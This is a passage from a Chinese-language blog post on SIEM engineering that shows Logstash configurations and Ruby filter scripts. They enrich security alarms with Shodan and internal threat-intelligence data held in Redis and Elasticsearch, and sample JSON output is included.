<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@expire</span> = params[<span class="string">&quot;expire&quot;</span>]</span><br><span class="line">    <span class="variable">@alert</span> = params[<span class="string">&quot;alert_prefix&quot;</span>]</span><br><span class="line">    <span class="variable">@alarm</span> = params[<span class="string">&quot;alarm_prefix&quot;</span>]</span><br><span class="line">    <span class="variable">@spider_key</span> = params[<span class="string">&quot;spider_key&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># connect to redis</span></span><br><span class="line">    <span class="variable">@ti_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;ti_db&quot;</span>])</span><br><span class="line">    <span class="variable">@spider_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;spider_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        ipaddr_src = IPAddr.new src_ip</span><br><span class="line">        ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line">    <span class="keyword">rescue</span> Exception =&gt; e</span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ipaddr_src.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = src_ip</span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> ipaddr_dst.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = dst_ip</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> [event]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> event.get(<span class="string">&quot;[event][kind]&quot;</span>) == <span class="string">&quot;alert&quot;</span> <span class="keyword">then</span></span><br><span class="line">        alert_ioc = <span class="variable">@alert</span> + ioc</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable">@ti_redis</span>.exists?(alert_ioc) <span class="keyword">then</span></span><br><span class="line">            <span class="variable">@ti_redis</span>.setex(alert_ioc, <span class="variable">@expire</span>, <span class="literal">true</span>)</span><br><span class="line">            <span class="variable">@spider_redis</span>.lpush(<span class="variable">@spider_key</span>, ioc)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-threatIntel-alarm-from-siem"><a href="#3-2-threatIntel-alarm-from-siem" class="headerlink" title="3.2 threatIntel_alarm_from_siem"></a>3.2 threatIntel_alarm_from_siem</h4><p>â€‹        é€šè¿‡Logstashè¿›è¡Œå¨èƒæƒ…æŠ¥æ•°æ®çš„ä¸°å¯ŒåŒ–ã€‚å¦‚ä¸Šå›¾ä¸­çº¢è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†ï¼›</p>
<h5 id="3-2-1-add-ti-tags-from-shodan"><a href="#3-2-1-add-ti-tags-from-shodan" class="headerlink" title="3.2.1 add-ti_tags_from_shodan"></a>3.2.1 add-ti_tags_from_shodan</h5><p>â€‹        å°†Shodan IoCæƒ…æŠ¥æ•°æ®ä¸°å¯ŒåŒ–è‡³alarmã€‚</p>
<h6 id="Logstash-Config-12"><a href="#Logstash-Config-12" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-ti_shodan.conf">add-ti_tags_from_shodan.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/ti_shodan.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;ti_db&quot;</span> =&gt; 1</span><br><span class="line">                <span class="string">&quot;alarm_prefix&quot;</span> =&gt; <span class="string">&quot;alarm:&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-4"><a href="#Ruby-Code-4" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-ti_shodan.rb">add-ti_tags_from_shodan.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@alarm</span> = params[<span class="string">&quot;alarm_prefix&quot;</span>]</span><br><span class="line">    <span class="comment"># connect to redis</span></span><br><span class="line">    <span class="variable">@ti_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;ti_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        ipaddr_src = IPAddr.new src_ip</span><br><span class="line">        ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line">    <span class="keyword">rescue</span> Exception =&gt; e</span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ipaddr_src.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = src_ip</span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> ipaddr_dst.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = dst_ip</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> [event]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    raw_data = <span class="variable">@ti_redis</span>.get(<span class="variable">@alarm</span> + ioc)</span><br><span class="line">    <span class="keyword">if</span> raw_data <span class="keyword">then</span></span><br><span class="line">        data = JSON.parse(raw_data)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">then</span></span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][services]&quot;</span>, data[<span class="string">&quot;services&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][vulns]&quot;</span>, data[<span class="string">&quot;vulns&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][ports]&quot;</span>, data[<span class="string">&quot;ports&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][hostnames]&quot;</span>, data[<span class="string">&quot;hostnames&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][domains]&quot;</span>, data[<span class="string">&quot;domains&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">&quot;details&quot;</span>] <span class="keyword">then</span></span><br><span class="line">                details = data[<span class="string">&quot;details&quot;</span>].to_json</span><br><span class="line">                event.set(<span class="string">&quot;[threat][hunting][details]&quot;</span>, details)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="ç¤ºä¾‹-3"><a href="#ç¤ºä¾‹-3" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h6><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hunting&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;vulns&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;CVE-2019-0220&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0197&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0196&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1302&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0211&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2017-15710&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1301&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1283&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1303&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2017-15715&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1333&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-17199&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-11763&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1312&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;domains&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;ports&quot;</span>: [</span><br><span class="line">                <span class="number">8888</span>,</span><br><span class="line">                <span class="number">80</span>,</span><br><span class="line">                <span class="number">8080</span>,</span><br><span class="line">                <span class="number">8090</span>,</span><br><span class="line">                <span class="number">22</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;details&quot;</span>: <span class="string">&quot;&#123;\&quot;tcp\&quot;:[&#123;\&quot;http-simple-new\&quot;:8888,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http\&quot;:80,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http\&quot;:8080,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http-simple-new\&quot;:8090&#125;,&#123;\&quot;ssh\&quot;:22,\&quot;OpenSSH\&quot;:\&quot;7.6p1 Ubuntu-4ubuntu0.3\&quot;&#125;],\&quot;udp\&quot;:[]&#125;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;hostnames&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;services&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;http-simple-new&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ssh&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-1.png" alt="image-20201205151011258"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-2.png" alt="image-20201205150744102"></p>
<h5 id="3-2-2-add-ti-tags"><a href="#3-2-2-add-ti-tags" class="headerlink" title="3.2.2 add-ti_tags"></a>3.2.2 add-ti_tags</h5><p>â€‹    è¿™éƒ¨åˆ†é€šå¸¸æ˜¯å¯¹æ¥çš„è‡ªæœ‰æƒ…æŠ¥ï¼ˆ<em>æˆ‘ä»¬ä¼šæ”¶é›†æ”»å‡»è¿‡æˆ‘ä»¬çš„IPï¼Œå»ºç«‹é€‚ç”¨äºè‡ªå·±çš„å†…éƒ¨æƒ…æŠ¥ã€‚</em>ï¼‰ä»¥åŠå¼€æºæƒ…æŠ¥ã€‚åŸåˆ™ä¸ŠSIEMäº§ç”Ÿçš„alarmäº‹ä»¶å¹¶ä¸ä¼šå¾ˆå¤šï¼Œæ‰€ä»¥è¿™è¾¹ç›´æ¥ä»Elasticè·å–äº†æƒ…æŠ¥æ•°æ®è¿›è¡Œå‘Šè­¦çš„ä¸°å¯ŒåŒ–ã€‚å¦‚æœalarmäº‹ä»¶å¾ˆå¤šçš„è¯ï¼Œå»ºè®®ä¹Ÿæ˜¯æ”¾åœ¨Redisæˆ–è€…å†è€ƒè™‘å…¶ä»–æ–¹æ¡ˆã€‚è¿‘æœŸå‡†å¤‡é‡‡è´­å•†ä¸šæƒ…æŠ¥ï¼ŒåæœŸå°†ä¼šæœ‰ä¸€ä¸ªå•†ä¸šæƒ…æŠ¥çš„å¯¹æ¥è¿‡ç¨‹ã€‚</p>
<h6 id="Logstash-Config-13"><a href="#Logstash-Config-13" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-ti_tags.conf">add-ti_tags.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-ti_tags.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;index&quot;</span> =&gt; <span class="string">&quot;ecs-ti-*&quot;</span></span><br><span class="line">                <span class="string">&quot;urls&quot;</span> =&gt; <span class="string">&quot;https://elastic:HelloWorld@127.0.0.1:9200&quot;</span></span><br><span class="line">                <span class="string">&quot;ca&quot;</span> =&gt; <span class="string">&quot;ca.crt&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-5"><a href="#Ruby-Code-5" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/ti_tags.rb">add-ti_tags.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;elasticsearch&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@urls</span> = params[<span class="string">&quot;urls&quot;</span>]</span><br><span class="line">    <span class="variable">@index</span> = params[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">    <span class="variable">@ca</span> = params[<span class="string">&quot;ca&quot;</span>]</span><br><span class="line">    <span class="variable">@client</span> = Elasticsearch::Client.new <span class="symbol">urls:</span> <span class="variable">@urls</span>, <span class="symbol">transport_options:</span> &#123; <span class="symbol">ssl:</span> &#123; <span class="symbol">ca_file:</span> <span class="variable">@ca</span> &#125; &#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    ioc = event.get(<span class="string">&#x27;[source][ip]&#x27;</span>)</span><br><span class="line">    query = &#123;</span><br><span class="line">        <span class="string">&quot;_source&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;includes&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;threat.tags&quot;</span>,</span><br><span class="line">                <span class="string">&quot;threat.provider&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;must&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;terms&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.type&quot;</span>: [</span><br><span class="line">                                <span class="string">&quot;ipv4&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;ip&quot;</span></span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;term&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.ioc&quot;</span>: ioc</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;filter&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.creation_time&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;now-7d&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;size&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="variable">@client</span>.search <span class="symbol">index:</span> <span class="variable">@index</span>, <span class="symbol">body:</span> query.to_json</span><br><span class="line"></span><br><span class="line">    tags = []</span><br><span class="line">    providers = []</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> response[<span class="string">&#x27;hits&#x27;</span>][<span class="string">&#x27;hits&#x27;</span>].empty? <span class="keyword">then</span></span><br><span class="line">        response[<span class="string">&#x27;hits&#x27;</span>][<span class="string">&#x27;hits&#x27;</span>].each <span class="keyword">do</span> <span class="params">|result|</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> providers.<span class="keyword">include</span>?(result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;provider&quot;</span>])</span><br><span class="line">                providers.push(result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;provider&quot;</span>])</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            tags = tags - result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;tags&quot;</span>]</span><br><span class="line">            tags = tags + result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;tags&quot;</span>]</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.set(<span class="string">&#x27;[threat][intelligence][tags]&#x27;</span>, tags)</span><br><span class="line">    event.set(<span class="string">&#x27;[threat][intelligence][providers]&#x27;</span>, providers)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="ç¤ºä¾‹-4"><a href="#ç¤ºä¾‹-4" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-3.png" alt="image-20201208144650226"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;intelligence&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;providers&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;NTA&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;WebAttack&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-Filter"><a href="#4-Filter" class="headerlink" title="4. Filter"></a>4. Filter</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/blacklist-1.png" alt="image-20201207153152332"></p>
<h4 id="4-1-alert-to-siem"><a href="#4-1-alert-to-siem" class="headerlink" title="4.1 alert_to_siem"></a>4.1 alert_to_siem</h4><h5 id="4-1-1-filter-ip-from-alert"><a href="#4-1-1-filter-ip-from-alert" class="headerlink" title="4.1.1 filter_ip_from_alert"></a>4.1.1 filter_ip_from_alert</h5><p>â€‹        å®é™…ä½¿ç”¨åœºæ™¯ä¸­éœ€è¦å¯¹ä¸€äº›ç™½åå•IPã€ç‰¹å®šç­¾åè§„åˆ™è¿›è¡Œè¿‡æ»¤ã€‚è¿™ä¹ˆåšä¹Ÿæ˜¯ä¸ºäº†ä¿è¯SIEMçš„æ€§èƒ½ä»¥åŠå‘Šè­¦çš„å¯é æ€§ã€‚è¿™éƒ¨åˆ†æ•°æ®ä¾æ—§ä¼šå‘é€åˆ°Elasticä½œä¸ºå†å²æ•°æ®ç•™å­˜ï¼Œä½†ä¸ä¼šè¢«SIEMæ¶ˆè´¹å¹¶äº§ç”Ÿå‘Šè­¦ã€‚</p>
<h6 id="Logstash-Config-14"><a href="#Logstash-Config-14" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><p>â€‹    åˆ©ç”¨<strong>Clone</strong>æ’ä»¶ï¼Œå°†éœ€è¦è¢«SIEMæ¶ˆè´¹çš„æ•°æ®ç»ç”±è„šæœ¬è¿‡æ»¤ã€‚</p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-siem_events.conf">filter_ip_from_alert.conf</a></strong></li>
</ul>
